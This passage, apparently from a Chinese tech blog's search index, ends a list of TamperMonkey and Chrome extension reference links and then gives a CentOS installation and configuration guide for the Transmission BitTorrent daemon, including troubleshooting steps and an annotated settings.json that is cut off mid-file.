title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"https://www.tampermonkey.net/documentation.php\">TamperMonkey官方文档</a></li>\n<li><a href=\"https://greasyfork.org/zh-CN\">Greasy Fork: 一个提供用户脚本的网站</a></li>\n<li><a href=\"https://www.cnblogs.com/grubber/p/12560522.html\">TamperMonkey中文参考文档</a></li>\n<li><a href=\"https://es6.ruanyifeng.com/\">ECMAScript 6 经典教程</a></li>\n<li><a href=\"https://developer.chrome.com/extensions/devtools\">Chrome DevTools Extensions官方文档</a></li>\n<li><a href=\"https://crxdoc-zh.appspot.com/extensions/devtools\">Chrome DevTools Extensions中文文档</a></li>\n<li><a href=\"https://crxdoc-zh.appspot.com/extensions/contentSecurityPolicy\">Chrome 内容安全策略（CSP）</a></li>\n<li><a href=\"https://zhaomenghuan.js.org/blog/chrome-devtools.html\">深入理解 Chrome DevTools</a></li>\n</ul>\n<h3 id=\"开发案例\"><a href=\"#开发案例\" class=\"headerlink\" title=\"开发案例\"></a>开发案例</h3><ul>\n<li><a href=\"https://juejin.cn/post/6844904127932137485\">Chrome Extension开发基础知识</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2016/09/csp.html\">Content Security Policy 入门教程</a></li>\n<li><a href=\"https://horve.github.io/2015/10/17/chrome-extension/\">chrome拓展开发实战：页面脚本的拦截注入</a></li>\n<li><a href=\"https://github.com/FoXZilla/Pxer/blob/master/README.zh.md\">基于TM插件的某个优秀图片爬虫</a></li>\n<li><a href=\"https://www.thinbug.com/q/52415273\">GM_getTab开发示例</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_42067967/article/details/105863853\">GM_addValueChangeListener开发示例</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/67221319\">一个TM爬虫的粗糙示例</a></li>\n<li><a href=\"https://juejin.cn/post/6844903575143841805\">常见跨域解决方案</a></li>\n</ul>\n"},{"title":"Transmission 安装和配置","url":"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Transmission是一个轻量级、跨平台、开源的 BitTorrent 客户端，官网地址是<a href=\"https://transmissionbt.com/\">https://transmissionbt.com/</a>，源码地址是<a href=\"https://github.com/transmission/transmission\">https://github.com/transmission/transmission</a>，当前最新版本是3.0。</p>\n<p><img src=\"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/home.png\" alt=\"Transmission 的官网首页\"></p>\n<p>其实现了BT协议的几乎全部功能，覆盖了Linux、MacOS、Windows等所有主流操作系统，核心组件包括：</p>\n<ul>\n<li>1个基于MacOS的Native Application</li>\n<li>2个基于Linux的Native Application，分别支持 GTK GUI和 QT GUI</li>\n<li>1个基于Linux的守护服务，用于服务器或路由器的后台服务</li>\n<li>1个WEB UI前端界面，通过Json RPC接口服务提供浏览器访问</li>\n</ul>\n<p><img src=\"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/arch.gif\" alt=\"Transmission技术架构\"></p>\n<h2 id=\"二、Centos的安装配置方法\"><a href=\"#二、Centos的安装配置方法\" class=\"headerlink\" title=\"二、Centos的安装配置方法\"></a>二、Centos的安装配置方法</h2><p>下面以Centos为例，介绍其安装和配置的基本步骤。</p>\n<h3 id=\"1-软件包安装\"><a href=\"#1-软件包安装\" class=\"headerlink\" title=\"1. 软件包安装\"></a>1. 软件包安装</h3><p>最简便的方法是使用EPEL源，简单粗暴就是：<code>yum install transmission</code>，当然严谨一点就是:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install transmission-daemon</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-系统自启动\"><a href=\"#2-系统自启动\" class=\"headerlink\" title=\"2. 系统自启动\"></a>2. 系统自启动</h3><p><code>transmission-daemon</code>支持<code>systemd</code>启动方式。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl start transmission-daemon --now</span><br><span class=\"line\">systemctl status transmission-daemon</span><br></pre></td></tr></table></figure>\n\n<p>如果后台服务正常启动，可以看到如下启动信息：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@test transmission]# systemctl status transmission-daemon</span><br><span class=\"line\">● transmission-daemon.service - Transmission BitTorrent Daemon</span><br><span class=\"line\">   Loaded: loaded (/usr/lib/systemd/system/transmission-daemon.service; disabled; vendor preset: disabled)</span><br><span class=\"line\">   Active: active (running) since 六 2022-04-16 22:10:31 CST; 34min ago</span><br><span class=\"line\"> Main PID: 12051 (transmission-da)</span><br><span class=\"line\">   Status: &quot;Idle.&quot;</span><br><span class=\"line\">   CGroup: /system.slice/transmission-daemon.service</span><br><span class=\"line\">           └─12051 /usr/bin/transmission-daemon -f --log-error</span><br><span class=\"line\"></span><br><span class=\"line\">4月 16 22:10:31 test.caogo.local systemd[1]: Starting Transmission BitTorrent Daemon...</span><br><span class=\"line\">4月 16 22:10:31 test.caogo.local systemd[1]: Started Transmission BitTorrent Daemon.</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-运行监控\"><a href=\"#3-运行监控\" class=\"headerlink\" title=\"3. 运行监控\"></a>3. 运行监控</h3><p>后台服务启动成功后，可以看到占用tcp&#x2F;udp 51413作为BT通信端口，占用tcp 9091端口用于访问Web UI。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@test lib]# netstat -tunpl |grep transmission</span><br><span class=\"line\">tcp        0      0 0.0.0.0:51413           0.0.0.0:*               LISTEN      11846/transmission- </span><br><span class=\"line\">tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      11846/transmission- </span><br><span class=\"line\">tcp6       0      0 :::51413                :::*                    LISTEN      11846/transmission- </span><br><span class=\"line\">udp        0      0 0.0.0.0:51413           0.0.0.0:*                           11846/transmission- </span><br></pre></td></tr></table></figure>\n\n<p>此时，通过浏览器打开<code>http://&lt;IP地址&gt;:9091</code>，就可以看到Web UI的局面了。</p>\n<p><img src=\"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/web.png\" alt=\"Web UI\"></p>\n<h2 id=\"三、Transmission软件包的构成分析\"><a href=\"#三、Transmission软件包的构成分析\" class=\"headerlink\" title=\"三、Transmission软件包的构成分析\"></a>三、Transmission软件包的构成分析</h2><p>最简便的方法是使用EPEL源，通过<code>yum search transmission</code>搜索，主要有以下软件包：</p>\n<ul>\n<li><code>transmission-common</code>: 核心组件，包含1个 Web GUI 和 4个命令行程序：<code>transmission-create | edit | remote | show</code></li>\n<li><code>transmission-daemon</code>: &#x3D; <code>transmission-common</code> + 1个后台守护程序<code>transmission-daemon</code></li>\n<li><code>transmission-cli</code>: &#x3D; <code>transmission-common</code> + 1个系统配置命令行程序<code>transmission-cli</code></li>\n<li><code>transmission-gtk</code>：&#x3D; <code>transmission-common</code> + 基于GTK GUI的Applicaition</li>\n<li><code>transmission-qt</code>：&#x3D; <code>transmission-common</code> + 基于Qt GUI的Applicaition</li>\n<li><code>transmission</code>: &#x3D; 常用安装包名，默认采用GTK，基本等于<code>transmission-gtk</code></li>\n</ul>\n<p>通过<code>yum info transmission-common</code>可以查看该软件包的基本信息。<br>通过<code>repoquery -ql transmission-common.x86_64</code>，可以查看该软件包的全部文件信息。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@test transmission]# yum info transmission-common</span><br><span class=\"line\">已加载插件：fastestmirror</span><br><span class=\"line\">Loading mirror speeds from cached hostfile</span><br><span class=\"line\">已安装的软件包</span><br><span class=\"line\">名称    ：transmission-common</span><br><span class=\"line\">架构    ：x86_64</span><br><span class=\"line\">版本    ：2.94</span><br><span class=\"line\">发布    ：9.el7</span><br><span class=\"line\">大小    ：3.0 M</span><br><span class=\"line\">源    ：installed</span><br><span class=\"line\">来自源：epel</span><br><span class=\"line\">简介    ： Transmission common files</span><br><span class=\"line\">网址    ：http://www.transmissionbt.com</span><br><span class=\"line\">协议    ： MIT and GPLv2</span><br><span class=\"line\">描述    ： Common files for Transmission BitTorrent client sub-packages. It includes</span><br><span class=\"line\">         : the web user interface, icons and transmission-remote, transmission-create,</span><br><span class=\"line\">         : transmission-edit, transmission-show utilities.</span><br><span class=\"line\"></span><br><span class=\"line\">[root@test transmission]# repoquery -ql transmission-daemon.x86_64</span><br><span class=\"line\">/usr/bin/transmission-daemon</span><br><span class=\"line\">/usr/lib/systemd/system/transmission-daemon.service</span><br><span class=\"line\">/usr/share/man/man1/transmission-daemon.1.gz</span><br><span class=\"line\">/var/lib/transmission</span><br></pre></td></tr></table></figure>\n\n<p>由此可以分析得出<code>transmission-daemon</code>安装过程的主要步骤包括：</p>\n<h3 id=\"1-创建默认用户\"><a href=\"#1-创建默认用户\" class=\"headerlink\" title=\"1. 创建默认用户\"></a>1. 创建默认用户</h3><p>安装完成后检查<code>/etc/passwd</code>，发现添加了一个不能登录的系统用户<code>transmission</code>。</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">transmission:x:998:995:transmission daemon account:/var/lib/transmission:/sbin/nologin</span><br></pre></td></tr></table></figure>\n\n<p>HOME就是软件包的默认安装目录<code>/var/lib/transmission</code>。</p>\n<h3 id=\"2-拷贝可执行程序\"><a href=\"#2-拷贝可执行程序\" class=\"headerlink\" title=\"2. 拷贝可执行程序\"></a>2. 拷贝可执行程序</h3><p>可执行程序的安装位置是<code>/usr/bin/</code>，可以发现有<code>transmission-daemon</code>等5个程序。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost transmission-daemon]<span class=\"comment\"># ls -l /usr/bin/transmission*</span></span><br><span class=\"line\">-rwxr-xr-x 1 root root 560880 5月  18 2020 /usr/bin/transmission-create</span><br><span class=\"line\">-rwxr-xr-x 1 root root 577152 5月  18 2020 /usr/bin/transmission-daemon</span><br><span class=\"line\">-rwxr-xr-x 1 root root 556456 5月  18 2020 /usr/bin/transmission-edit</span><br><span class=\"line\">-rwxr-xr-x 1 root root 597360 5月  18 2020 /usr/bin/transmission-remote</span><br><span class=\"line\">-rwxr-xr-x 1 root root 556464 5月  18 2020 /usr/bin/transmission-show</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-拷贝软件文档\"><a href=\"#3-拷贝软件文档\" class=\"headerlink\" title=\"3. 拷贝软件文档\"></a>3. 拷贝软件文档</h3><p>yum安装软件包时，通常在以下目录补充该软件的文档信息：</p>\n<ul>\n<li>&#x2F;usr&#x2F;share&#x2F;doc&#x2F;：本软件使用说明书</li>\n<li>&#x2F;usr&#x2F;share&#x2F;icons&#x2F;：本软件使用的各种尺寸的图标</li>\n<li>&#x2F;usr&#x2F;share&#x2F;licenses&#x2F;：本软件的许可证文件</li>\n<li>&#x2F;usr&#x2F;share&#x2F;man&#x2F;：man命令的帮助信息</li>\n<li>&#x2F;usr&#x2F;share&#x2F;pixmaps&#x2F;：本软件Logo的位图</li>\n</ul>\n<h3 id=\"4-拷贝Web-UI\"><a href=\"#4-拷贝Web-UI\" class=\"headerlink\" title=\"4. 拷贝Web UI\"></a>4. 拷贝Web UI</h3><p>Transmission的Web UI的入口文件存储在<code>/usr/share/transmission/web/index.html</code>，其结构与普通网站一致：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">web</span><br><span class=\"line\">├── images</span><br><span class=\"line\">├── index.html</span><br><span class=\"line\">├── javascript</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">└── style</span><br><span class=\"line\">    ├── jqueryui</span><br><span class=\"line\">    └── transmission</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-设置系统启动服务\"><a href=\"#5-设置系统启动服务\" class=\"headerlink\" title=\"5. 设置系统启动服务\"></a>5. 设置系统启动服务</h3><p>采用systemd的启动方式，服务配置文件是<code>/usr/lib/systemd/system/transmission-daemon.service</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Transmission BitTorrent Daemon</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">User=transmission</span><br><span class=\"line\">Type=notify</span><br><span class=\"line\">ExecStart=/usr/bin/transmission-daemon -f --log-error</span><br><span class=\"line\">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-设置软件包的数据目录\"><a href=\"#6-设置软件包的数据目录\" class=\"headerlink\" title=\"6. 设置软件包的数据目录\"></a>6. 设置软件包的数据目录</h3><p>Transmission-daemon的配置文件隐藏在<code>$HOME/.config/transmission-daemon/</code>，而不是常规的<code>/etc/</code><br>HOME的目录结构如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@test transmission]# tree /var/lib/transmission -a</span><br><span class=\"line\">/var/lib/transmission</span><br><span class=\"line\">├── .config/                    # 配置文件目录</span><br><span class=\"line\">│   └── transmission-daemon/ </span><br><span class=\"line\">│       ├── blocklists/         # 各个种子文件的数据块信息</span><br><span class=\"line\">│       ├── resume/             # 各个种子文件的运行状态</span><br><span class=\"line\">│       ├── settings.json       # 主配置文件，json格式</span><br><span class=\"line\">│       ├── stats.json          # 当前系统运行状态，json格式</span><br><span class=\"line\">│       ├── dht.dat             # 存储DHT节点信息</span><br><span class=\"line\">│       └── torrents/           # 种子文件的存储目录</span><br><span class=\"line\">├── Downloads/                  # 下载数据文件的存储目录</span><br><span class=\"line\">└── .pki/</span><br><span class=\"line\">    └── nssdb/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、Transmission跨平台技术方案分析\"><a href=\"#四、Transmission跨平台技术方案分析\" class=\"headerlink\" title=\"四、Transmission跨平台技术方案分析\"></a>四、Transmission跨平台技术方案分析</h2><p><code>Transmission core</code>作为核心引擎，负责实现BT协议的全部功能，其底层依赖两个外部库函数：</p>\n<ul>\n<li><code>libevent</code>：一个异步事件处理软件库。libevent提供了一组应用程序编程接口（API），允许开发者为事件注册回调函数，用来取代网络服务器所使用的事件循环检查框架。</li>\n<li><code>libnatpmp</code>：一个NAT-PMP协议库。NAT-PMP（Network Address Translation Port Mapping Protocol）协议通过端口映射的方式获取外网主机的IP地址。</li>\n</ul>\n<p>其对外提供服务主要通过以下接口实现：</p>\n<ul>\n<li><code>JSON RPC Server</code>：提供网络远程调用接口，以JSON格式</li>\n<li><code>Web App Server</code>：基于通用Web Server，以Web形式通过网络App应用服务接口</li>\n<li><code>Lib Transmission</code>：提供C语言的库函数接口，仅能用于Native Application</li>\n</ul>\n<p><img src=\"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/products.gif\" alt=\"APP结构\"><br>以上各软件包的技术依赖关系参见<a href=\"https://github.com/transmission/transmission/blob/main/docs/Transmission-Architecture.md\">Transmission技术架构</a></p>\n<h3 id=\"1-MacOS\"><a href=\"#1-MacOS\" class=\"headerlink\" title=\"1. MacOS\"></a>1. MacOS</h3><p>Transmission以Native Application的方式发布，形态是一个DMG安装包。<br>开发了一个基于GTK GUI的Native GUI，直接采用Transmission core提供的Lib库函数。</p>\n<blockquote>\n<p>Mac OS平台的配置文件目录存在差异，每个种子文件的状态信息位于：<code>~/Library/Application Support/Transmission</code>，而全局配置文件位于：<code>~/Library/Preferences/org.m0k.transmission.plist</code></p>\n</blockquote>\n<h3 id=\"2-Windows\"><a href=\"#2-Windows\" class=\"headerlink\" title=\"2. Windows\"></a>2. Windows</h3><p>Transmission以Native Application的方式发布，形态是一个MSI安装包，分为32位和64位两个版本。<br>开发了一个基于Qt GUI的Native GUI，注意其采用的是JSON RPC接口服务，需要网络组件支持。</p>\n<h3 id=\"3-Linux桌面版\"><a href=\"#3-Linux桌面版\" class=\"headerlink\" title=\"3. Linux桌面版\"></a>3. Linux桌面版</h3><p>Linux桌面系统的市场份额很少，但是很庞杂：</p>\n<ul>\n<li>KDE：排名第一，基于Qt GUI开发</li>\n<li>GNOME：简单速度快，红帽等Linux发行版常用，基于GPK GUI开发<br>此外，GNOME还有多个不同版本的变种，包括Unity、MATE、Cinnamon等</li>\n</ul>\n<blockquote>\n<p>Qt GUI和GPK GUI的配置文件都存储在：<code>$HOME/.config/transmission/</code></p>\n</blockquote>\n<h3 id=\"4-Linux服务器\"><a href=\"#4-Linux服务器\" class=\"headerlink\" title=\"4. Linux服务器\"></a>4. Linux服务器</h3><p>安装<code>transmission-daemon</code>提供后台服务，再通过Web UI提供管理界面是最直接的方案。<br>本机也可以通过<code>transmission-cli</code>提供一个字符界面的管理工具，但是没有人有兴趣使用如此简陋的工具。</p>\n<blockquote>\n<p>transmission-cli的配置文件存储在：<code>$HOME/.config/transmission-cli/</code></p>\n</blockquote>\n<h3 id=\"5-嵌入式设备\"><a href=\"#5-嵌入式设备\" class=\"headerlink\" title=\"5. 嵌入式设备\"></a>5. 嵌入式设备</h3><p>群晖NAS、西部数据NAS、D-Link路由器等嵌入式设备都是基于Linux核心，因此也可以安装Transmission。<br>以西部数据NAS为例，MyBookLive、MyCloud在技术上都可支持，但由于不属于官方项目，因此版本升级时经常被限制。<br>具体安装方法参见<a href=\"http://mybookworld.wikidot.com/optware\">http://mybookworld.wikidot.com/optware</a></p>\n<h2 id=\"五、常见问题的解决方案\"><a href=\"#五、常见问题的解决方案\" class=\"headerlink\" title=\"五、常见问题的解决方案\"></a>五、常见问题的解决方案</h2><h3 id=\"1：UDP缓冲区不足导致Daemon启动失败\"><a href=\"#1：UDP缓冲区不足导致Daemon启动失败\" class=\"headerlink\" title=\"1：UDP缓冲区不足导致Daemon启动失败\"></a>1：UDP缓冲区不足导致Daemon启动失败</h3><p>如果启动失败，并产生如下信息，通常是操作系统的UDP网络缓冲区不足</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">UDP Failed to set receive buffer: requested 4194304, got 425984 (tr-udp.c:84)</span><br><span class=\"line\">UDP Failed to set send buffer: requested 1048576, got 425984 (tr-udp.c:95)</span><br></pre></td></tr></table></figure>\n\n<p>解决办法是通过<code>sysctl -p</code>命令来检查，并修改位于<code>/etc/sysctl.conf</code>的内核参数</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &#x27;net.core.rmem_max = 16777216&#x27; &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">echo &#x27;net.core.wmem_max = 4194304&#x27; &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">sysctl -p</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Web-UI界面无法打开\"><a href=\"#2-Web-UI界面无法打开\" class=\"headerlink\" title=\"2: Web UI界面无法打开\"></a>2: Web UI界面无法打开</h3><p>如果浏览器提示“403: Forbidden”错误信息，并提示“Unauthorized IP Addres”，通常是因为默认只允许来自本机<code>127.0.0.1</code>的白名单访问。<br>解决方法是：</p>\n<ol>\n<li><p>停止守护进程，否则修改无法存盘；</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl stop transmission-daemon</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编辑配置文件，修改<code>rpc-whitelist-enabled</code>为<code>false</code></p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi /var/lib/transmission/.config/transmission-daemon/settings.json</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重新启动守护进程，并打开浏览器正常访问。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl start transmission-daemon</span><br></pre></td></tr></table></figure></li>\n</ol>\n<hr>\n<h2 id=\"附录一：全量配置参数\"><a href=\"#附录一：全量配置参数\" class=\"headerlink\" title=\"附录一：全量配置参数\"></a>附录一：全量配置参数</h2><p>以Centos为例，其配置文件位于<code>/var/lib/transmission/.config/transmission-daemon/settings.json</code>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;alt-speed-up&quot;</span>: 500, <span class=\"comment\">#计划时段上传限速值</span></span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-down&quot;</span>: 500, <span class=\"comment\">#计划时段下载限速值</span></span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-time-begin&quot;</span>: 540,</span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-time-day&quot;</span>: 127,</span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-time-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#启用计划工作，为false时，以上计划配置则不生效</span></span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-time-end&quot;</span>: 420, <span class=\"comment\">#计划结束时间，为零点到开始时间的分钟数，比如7:00就是7*60=420。另外，该时间是用的GMT时间，即北京时间-8小时。比如你计划北京时间7点30分开始，这个数字应该是（7-8+24）*60+30=1410</span></span><br><span class=\"line\"><span class=\"string\">&quot;bind-address-ipv4&quot;</span>: <span class=\"string\">&quot;0.0.0.0&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;bind-address-ipv6&quot;</span>: <span class=\"string\">&quot;::&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;blocklist-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;blocklist-updates-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;blocklist-url&quot;</span>: <span class=\"string\">&quot;http://www.example.com/blocklist&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;cache-size-mb&quot;</span>: 4, <span class=\"comment\">#缓存大小，以MB为单位，建议设大一些，避免频繁读写硬盘而伤硬盘，建议设为内存大小的1/6～1/4</span></span><br><span class=\"line\"><span class=\"string\">&quot;compact-view&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;dht-enabled&quot;</span>: <span class=\"literal\">false</span>, <span class=\"comment\">#关闭DHT（不通过tracker寻找节点）功能，不少PT站的要求，但BT下载设置为true会使得下载更好</span></span><br><span class=\"line\"><span class=\"string\">&quot;download-dir&quot;</span>: <span class=\"string\">&quot;/home/yys/Downloads&quot;</span>, <span class=\"comment\">#下载的内容存放的目录</span></span><br><span class=\"line\"><span class=\"string\">&quot;download-queue-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;download-queue-size&quot;</span>: 5,</span><br><span class=\"line\"><span class=\"string\">&quot;encryption&quot;</span>: 1, <span class=\"comment\">#0=不加密，1=优先加密，2=必须加密</span></span><br><span class=\"line\"><span class=\"string\">&quot;idle-seeding-limit&quot;</span>: 30,</span><br><span class=\"line\"><span class=\"string\">&quot;idle-seeding-limit-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;incomplete-dir&quot;</span>: <span class=\"string\">&quot;/home/yys/Downloads&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;incomplete-dir-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;inhibit-desktop-hibernation&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;lpd-enabled&quot;</span>: <span class=\"literal\">false</span>, <span class=\"comment\">#禁用LDP（本地节点发现，用于在本地网络寻找节点）,不少PT站的要求</span></span><br><span class=\"line\"><span class=\"string\">&quot;main-window-height&quot;</span>: 500,</span><br><span class=\"line\"><span class=\"string\">&quot;main-window-is-maximized&quot;</span>: 0,</span><br><span class=\"line\"><span class=\"string\">&quot;main-window-width&quot;</span>: 615,</span><br><span class=\"line\"><span class=\"string\">&quot;main-window-x&quot;</span>: 337,</span><br><span class=\"line\"><span class=\"string\">&quot;main-window-y&quot;</span>: 211,</span><br><span class=\"line\"><span class=\"string\">&quot;message-level&quot;</span>: 2,</span><br><span class=\"line\"><span class=\"string\">&quot;open-dialog-dir&quot;</span>: <span class=\"string\">&quot;/home/yys/\\u684c\\u9762&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;peer-congestion-algorithm&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;peer-limit-global&quot;</span>: 240, <span class=\"comment\">#全局连接数</span></span><br><span class=\"line\"><span class=\"string\">&quot;peer-limit-per-torrent&quot;</span>: 60, <span class=\"comment\">#每个种子最多的连接数</span></span><br><span class=\"line\"><span class=\"string\">&quot;peer-port&quot;</span>: 51413, <span class=\"comment\">#预设的port口</span></span><br><span class=\"line\"><span class=\"string\">&quot;peer-port-random-high&quot;</span>: 65535,</span><br><span class=\"line\"><span class=\"string\">&quot;peer-port-random-low&quot;</span>: 49152,</span><br><span class=\"line\"><span class=\"string\">&quot;peer-port-random-on-start&quot;</span>: <span class=\"literal\">false</span>, <span class=\"comment\">#不建议改为true</span></span><br><span class=\"line\"><span class=\"string\">&quot;peer-socket-tos&quot;</span>: <span class=\"string\">&quot;default&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;pex-enabled&quot;</span>: <span class=\"literal\">false</span>, <span class=\"comment\">#禁用PEX（节点交换，用于同已与您相连接的节点交换节点名单）,不少PT站的要求</span></span><br><span class=\"line\"><span class=\"string\">&quot;port-forwarding-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;preallocation&quot;</span>: 1, <span class=\"comment\">#预分配文件磁盘空间，0=关闭，1=快速，2=完全。建议取1开启该功能，防止下载大半了才发现磁盘不够。取2时，可以减少磁盘碎片，但速度较慢。</span></span><br><span class=\"line\"><span class=\"string\">&quot;prefetch-enabled&quot;</span>: 1,</span><br><span class=\"line\"><span class=\"string\">&quot;queue-stalled-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;queue-stalled-minutes&quot;</span>: 30,</span><br><span class=\"line\"><span class=\"string\">&quot;ratio-limit&quot;</span>: 2,</span><br><span class=\"line\"><span class=\"string\">&quot;ratio-limit-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rename-partial-files&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#在未完成的文件名后添加后缀.part,false=禁用</span></span><br><span class=\"line\"><span class=\"string\">&quot;rpc-authentication-required&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-bind-address&quot;</span>: <span class=\"string\">&quot;0.0.0.0&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-password&quot;</span>: <span class=\"string\">&quot;&#123;c8c083168db9fff40b5136b6d0f3f4a864110a78\\/oH51JaE&quot;</span>, <span class=\"comment\">#web-ui的密码，可直接修改，重新运行或者reload服务的时候会自动被加密</span></span><br><span class=\"line\"><span class=\"string\">&quot;rpc-port&quot;</span>: 9091, <span class=\"comment\">#默认web-ui的port口，可自行更改</span></span><br><span class=\"line\"><span class=\"string\">&quot;rpc-url&quot;</span>: <span class=\"string\">&quot;/transmission/&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-username&quot;</span>: <span class=\"string\">&quot;transmission&quot;</span>, <span class=\"comment\">#默认登入名称</span></span><br><span class=\"line\"><span class=\"string\">&quot;rpc-whitelist&quot;</span>: <span class=\"string\">&quot;127.0.0.1&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-whitelist-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#如果你要让其他网段连入，请设false</span></span><br><span class=\"line\"><span class=\"string\">&quot;scrape-paused-torrents-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;script-torrent-done-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;script-torrent-done-filename&quot;</span>: <span class=\"string\">&quot;/home/yys&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;seed-queue-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;seed-queue-size&quot;</span>: 10,</span><br><span class=\"line\"><span class=\"string\">&quot;show-backup-trackers&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-extra-peer-details&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-filterbar&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-notification-area-icon&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-options-window&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-statusbar&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-toolbar&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-tracker-scrapes&quot;</span>: <span 